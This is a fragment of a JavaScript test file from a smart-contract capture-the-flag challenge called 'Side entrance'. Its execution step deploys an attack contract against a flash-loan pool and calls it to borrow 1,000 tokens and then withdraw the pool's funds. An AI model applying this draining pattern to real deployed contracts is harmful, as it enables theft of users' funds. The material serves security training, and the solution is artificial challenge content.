...
describe("[Challenge] Side entrance", function () {
  ...
  it("Execution", async function () {
    sideAttack = await (
      await ethers.getContractFactory("FlashLoanSideEntrance", deployer)
    ).deploy(pool.address);
    await sideAttack.connect(player).initiateFlashLoan(1000n * 10n ** 18n);
    await sideAttack.connect(player).withdrawFunds();
  });
